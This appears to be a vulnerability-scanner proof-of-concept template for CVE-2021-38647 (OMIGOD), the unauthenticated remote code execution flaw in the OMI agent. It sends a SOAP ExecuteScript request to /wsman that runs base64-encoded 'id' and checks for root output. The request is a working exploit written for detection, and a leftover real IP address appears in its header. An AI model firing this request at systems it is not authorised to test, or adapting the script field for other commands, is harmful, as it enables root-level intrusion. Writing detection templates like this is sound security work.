id: poc-yaml-omi-agent-an-unauthenticated-rce
info:
  name: OMI agent 未经身份验证RCE(CVE-2021-38647)
  severity: critical
  tags:
  - rce
  - CVE-2021-38647
  finger: azure_security_center
variables:
  t1: base64("id")
requests:
- method: POST
  path: /wsman
  headers:
    Content-Type: application/soap+xml;charset=UTF-8
  data: '<s:Envelope

    xmlns:s="http://www.w3.org/2003/05/soap-envelope"

    xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"

    xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"

    xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"

    xmlns:xsi="http://www.w3.org/2001/XMLSchema"

    xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"

    xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">

    <s:Header>

    <a:To>HTTP://12.170.109.148/wsman/</a:To>

    <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>

    <a:ReplyTo>

    <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>

    </a:ReplyTo>

    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>

    <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>

    <a:MessageID>uuid:00B60932-CC01-0005-0000-000000010000</a:MessageID>

    <w:OperationTimeout>PT1M30S</w:OperationTimeout>

    <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>

    <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>

    <w:OptionSet s:mustUnderstand="true"/>

    <w:SelectorSet>

    <w:Selector Name="__cimnamespace">root/scx</w:Selector>

    </w:SelectorSet>

    </s:Header>

    <s:Body>

    <p:ExecuteScript_INPUT

    xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">

    <p:Script>{{.t1}}</p:Script>

    <p:Arguments/>

    <p:timeout>0</p:timeout>

    <p:b64encoded>true</p:b64encoded>

    </p:ExecuteScript_INPUT>

    </s:Body>

    </s:Envelope>'
  expression: 'status_code == 200 &&

    contains(body,"uid=0(root) gid=0(root) groups=0") &&

    contains(body,"<p:StdOut>")

    '
transport: http
